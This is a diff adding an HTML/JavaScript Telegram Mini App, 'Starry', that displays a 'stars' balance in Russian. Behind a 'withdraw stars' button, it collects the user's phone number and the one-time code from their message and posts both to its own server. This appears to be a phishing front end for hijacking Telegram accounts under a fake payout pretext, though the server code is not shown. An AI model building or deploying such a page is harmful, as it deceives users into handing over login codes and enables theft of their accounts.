@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starry Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+        button { padding: 10px 20px; font-size: 18px; margin: 10px; }
+        #balance { font-size: 24px; margin: 20px; }
+        #authForm { display: none; }
+    </style>
+</head>
+<body>
+    <h1>Starry Balance</h1>
+    <div id="balance">Загрузка баланса...</div>
+    <button id="withdrawBtn">Вывести звёзды</button>
+
+    <div id="authForm">
+        <h2>Авторизация для вывода</h2>
+        <p>Мы отправим код на ваш номер телефона.</p>
+        <input type="text" id="phone" placeholder="Номер телефона (с кодом страны, напр. +79123456789)" />
+        <button id="sendCodeBtn">Отправить код</button>
+        <br><br>
+        <input type="text" id="code" placeholder="Код из сообщения" />
+        <button id="verifyBtn">Подтвердить</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        const userId = tg.initDataUnsafe.user.id;
+        const balanceEl = document.getElementById('balance');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const authForm = document.getElementById('authForm');
+        const phoneInput = document.getElementById('phone');
+        const sendCodeBtn = document.getElementById('sendCodeBtn');
+        const codeInput = document.getElementById('code');
+        const verifyBtn = document.getElementById('verifyBtn');
+
+        // Загрузка баланса
+        async function loadBalance() {
+            const res = await fetch('/api/balance', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ initData: tg.initData, userId })
+            });
+            const data = await res.json();
+            if (data.balance !== undefined) {
+                balanceEl.innerText = `Ваш баланс: ${data.balance} звёзд`;
+            } else {
+                balanceEl.innerText = 'Ошибка загрузки баланса';
+            }
+        }
+
+        loadBalance();
+
+        // Кнопка вывода
+        withdrawBtn.onclick = () => {
+            if (confirm('Вывести все звёзды?')) {
+                authForm.style.display = 'block';
+                // Автозаполнение номера через Telegram
+                tg.requestContact((status, response) => {
+                    if (status === 'sent') {
+                        phoneInput.value = response.phone_number;
+                    }
+                });
+            }
+        };
+
+        // Отправка кода
+        sendCodeBtn.onclick = async () => {
+            const phone = phoneInput.value;
+            const res = await fetch('/api/send-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ initData: tg.initData, userId, phone })
+            });
+            const data = await res.json();
+            alert(data.message);
+        };
+
+        // Верификация и вывод
+        verifyBtn.onclick = async () => {
+            const code = codeInput.value;
+            const res = await fetch('/api/verify-withdraw', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ initData: tg.initData, userId, code })
+            });
+            const data = await res.json();
+            alert(data.message);
+            if (data.success) {
+                loadBalance();
+                authForm.style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
